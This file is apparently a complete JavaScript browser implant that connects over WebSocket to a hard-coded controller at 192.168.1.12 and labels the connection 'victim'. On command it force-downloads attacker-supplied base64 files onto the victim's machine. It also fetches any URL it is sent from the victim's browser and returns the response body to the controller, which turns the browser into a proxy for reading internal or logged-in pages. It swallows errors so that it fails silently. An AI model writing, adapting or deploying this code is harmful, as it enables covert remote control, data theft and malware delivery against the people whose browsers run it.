const socket = new WebSocket("wss://192.168.1.12:8443/ws");

socket.onopen = () => {
  socket.send("victim");
  console.log("[+] WebSocket connected (victim)");
};

socket.onmessage = async (event) => {
  const data = event.data;
  
  // Check if the message is a file transfer command
  if (data.startsWith("file:")) {
    // Expected format: "file:filename.ext|<base64data>"
    const parts = data.split("|", 2);
    if (parts.length === 2) {
      const header = parts[0]; // "file:filename.ext"
      const base64Data = parts[1];
      const filename = header.slice(5); // Remove "file:" prefix
      // Decode base64 string to binary data
      const binary = atob(base64Data);
      const len = binary.length;
      const bytes = new Uint8Array(len);
      for (let i = 0; i < len; i++) {
        bytes[i] = binary.charCodeAt(i);
      }
      const blob = new Blob([bytes]);
      // Create a temporary download link and auto-click it
      const blobUrl = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = blobUrl;
      a.download = filename;
      // Append to the document and trigger click to start download
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      console.log(`File "${filename}" received (${blob.size} bytes) and automatically downloaded.`);
      // Optionally, send a confirmation back via WebSocket:
      socket.send(`[FILE RECEIVED] ${filename} (${blob.size} bytes)`);
    }
    return;
  }

  // Otherwise, assume the message is a URL to fetch
  try {
    const res = await fetch(data);
    if (res.status >= 200 && res.status < 500) {
      const text = await res.text();
      socket.send(`[✅] ${data} → ${res.status}`);
      socket.send(`[📄] Body Preview:\n${text.slice(0, 1000)}\n---`);
    }
  } catch (err) {
    // Fail silently
  }
};
